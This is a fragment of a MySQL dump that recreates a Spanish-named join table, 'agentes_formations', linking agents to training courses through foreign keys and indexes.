DROP TABLE IF EXISTS `agentes_formations`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `agentes_formations` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `formacione_id` int(11) NOT NULL,
  `codigo_agente` int(11) NOT NULL,
  `is_trabajado` tinyint(1) NOT NULL DEFAULT 1,
  `observacion` text DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `formacion_id` (`formacione_id`,`codigo_agente`),
  KEY `codigo_agente` (`codigo_agente`),
  CONSTRAINT `agentes_formations_ibfk_1` FOREIGN KEY (`formacione_id`) REFERENCES `formaciones` (`id`) ON DELETE CASCADE ON UPDATE CASCADE,
  CONSTRAINT `agentes_formations_ibfk_2` FOREIGN KEY (`codigo_agente`) REFERENCES `agentes` (`codigo_agente`) ON DELETE CASCADE ON UPDATE CASCADE
) ENGINE=InnoDB AUTO_INCREMENT=1443 DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

